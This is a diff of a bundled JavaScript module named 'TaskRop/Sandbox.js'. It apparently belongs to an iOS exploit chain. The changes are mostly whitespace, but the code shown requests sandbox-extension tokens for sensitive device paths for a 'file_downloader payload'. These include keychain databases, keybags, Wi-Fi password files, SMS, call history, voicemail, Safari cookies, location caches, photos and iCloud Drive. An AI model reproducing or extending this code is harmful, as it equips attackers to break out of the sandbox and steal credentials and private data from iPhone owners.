@@ -1,3 +1,9 @@
+/***/ "./src/libs/TaskRop/Sandbox.js":
+/*!*************************************!*\
+  !*** ./src/libs/TaskRop/Sandbox.js ***!
+  \*************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
 __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
 /* harmony export */   "default": () => (/* binding */ Sandbox)
@@ -30,18 +36,18 @@ class Sandbox {
 		"/private/var/mobile/Library/Mail/":0,
 		"/private/var/mobile/Library/Voicemail/":0,
 		"/var/mobile/Library/Recordings":0,
-
+		
 		// Location
 		"/private/var/root/Library/Caches/locationd":0,
 		"/private/var/root/Library/Caches/locationd/":0,
 		"/private/var/mobile/Library/Caches/locationd/":0,
 		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
-
+		
 		// Browser & Cookies
 		"/private/var/mobile/Library/Safari/":0,
 		"/private/var/mobile/Library/Cookies/":0,
 		"/private/var/mobile/Cookies/":0,
-
+		
 		// Credentials & WiFi
 		"/private/var/Keychains/":0,
 		"/var/Keychains/":0,
@@ -83,7 +89,7 @@ class Sandbox {
 		"/private/var/db/":0,
 		"/var/run/":0,
 		"/private/var/run/":0,
-
+		
 		// Personal Data
 		"/private/var/mobile/Library/Notes/":0,
 		"/private/var/mobile/Library/Health/":0,
@@ -93,20 +99,20 @@ class Sandbox {
 		"/var/mobile/Media/":0,
 		"/var/mobile/Media/PhotoData/":0,
 		"/var/mobile/Media/DCIM/":0,
-
+		
 		// Device Info
 		"/private/var/root/Library/Lockdown/":0,
 		"/private/var/mobile/Library/Preferences/":0,
 		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
 		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
-
+		
 		// Accounts
 		"/private/var/mobile/Library/Accounts/":0,
-
+		
 		// Protected & Trust
 		"/private/var/protected/trustd/private/":0,
 		"/private/var/protected/trustd/private":0,
-
+		
 		// System & Apps
 		"/bin/":0,
 		"/Applications/":0,
@@ -116,14 +122,14 @@ class Sandbox {
 		"/private/var/mobile/Containers/Data/Application/":0,
 		"/var/mobile/Containers/Data/Application/":0,
 		"/private/var/mobile/Containers/Shared/AppGroup/":0,
-
+		
 		// Notifications & Logs
 		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
 		"/private/var/mobile/Library/UserNotifications/":0,
 		"/private/var/mobile/Library/Logs/CrashReporter/":0,
 		"/private/var/mobile/Library/ExternalAccessory":0,
 		"/private/var/mobile/Library/Shortcuts/":0,
-
+		
 		// Temp directory for file operations
 		"/private/var/tmp/":0,
 		"/tmp/":0
@@ -196,35 +202,35 @@ class Sandbox {
 			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
 			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
 		//}
-
+		
 		// Forensic file paths for file_downloader payload
 		console.log(TAG, "Create tokens for forensic paths...");
 		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
 		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
 		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);
-
+		
 		// Keychain tokens (with /private prefix)
 		this.getTokenForPath("/private/var/Keychains/", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);
-
+		
 		// Keychain tokens (without /private prefix - alternate)
 		this.getTokenForPath("/var/Keychains/", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);
-
+		
 		// Keybag tokens (legacy location)
 		this.getTokenForPath("/private/var/keybags/", true);
 		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
 		this.getTokenForPath("/private/var/keybags/persona.kb", true);
 		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
 		this.getTokenForPath("/private/var/keybags/backup/", true);
-
+		
 		// Keybag tokens (without /private - alternate)
 		this.getTokenForPath("/var/keybags/", true);
 		this.getTokenForPath("/var/keybags/systembag.kb", true);
@@ -232,7 +238,7 @@ class Sandbox {
 		this.getTokenForPath("/var/keybags/usersession.kb", true);
 		this.getTokenForPath("/var/keybags/backup/", true);
 		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);
-
+		
 		// Keybag tokens (Keychains directory - iOS 18)
 		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
 		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
@@ -240,11 +246,11 @@ class Sandbox {
 		this.getTokenForPath("/private/var/Keychains/usersession.kb", true);
 		this.getTokenForPath("/private/var/Keychains/device.kb", true);
 		this.getTokenForPath("/var/Keychains/persona.kb", true);
-
+		
 		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", true);
 		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
 		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);
-
+		
 		// WiFi password file locations (for pickup from wifid)
 		this.getTokenForPath("/var/wireless/", true);
 		this.getTokenForPath("/private/var/wireless/", true);
@@ -261,7 +267,7 @@ class Sandbox {
 		this.getTokenForPath("/var/run/", true);
 		this.getTokenForPath("/private/var/run/", true);
 		this.getTokenForPath("/private/var/networkd/", true);
-
+		
 		this.getTokenForPath("/private/var/mobile/Library/Safari/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Cookies/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Caches/locationd/", true);
@@ -271,7 +277,7 @@ class Sandbox {
 		this.getTokenForPath("/private/var/mobile/Media/PhotoData/", true);
 		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
 		this.getTokenForPath("/var/mobile/Media/", true);
-
+		
 		// iCloud Drive tokens
 		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
@@ -440,3 +446,6 @@ class Sandbox {
 		return true;
 	}
 }
+
+
+/***/ }),
